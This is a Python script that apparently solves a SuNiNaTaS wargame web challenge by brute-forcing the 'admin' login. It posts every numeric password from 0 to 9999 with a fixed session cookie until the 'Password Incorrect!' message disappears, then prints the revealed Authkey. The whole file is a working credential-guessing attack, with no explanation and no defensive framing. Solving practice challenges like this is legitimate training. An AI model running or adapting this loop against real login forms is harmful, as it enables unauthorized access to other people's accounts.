import requests
import time
start=time.time()
URL="http://suninatas.com/Part_one/web08/web08.asp"

cookie={
    "ASPSESSIONIDSSBQARAS":"OLNFADNDNDFHNPODNAPIGADJ"
    }
session1=requests.Session()

for i in range(10000) :
    data1={
        "id":"admin",
        "pw":i
       }

    req=session1.post(URL, cookies=cookie, data=data1)
    if (req.text.find("Password Incorrect!") == -1 ) :
        index=req.text.find("Authkey")
        print ("\n\n")
        print (req.text[index:index+30])
        print ("\n\n")
        end=time.time()-start
        print ("%d"%(float(end)))
        input("Press Any KEY to exit......")
        exit (0)
    else :
        print ("Wrong Num : "+str(i))

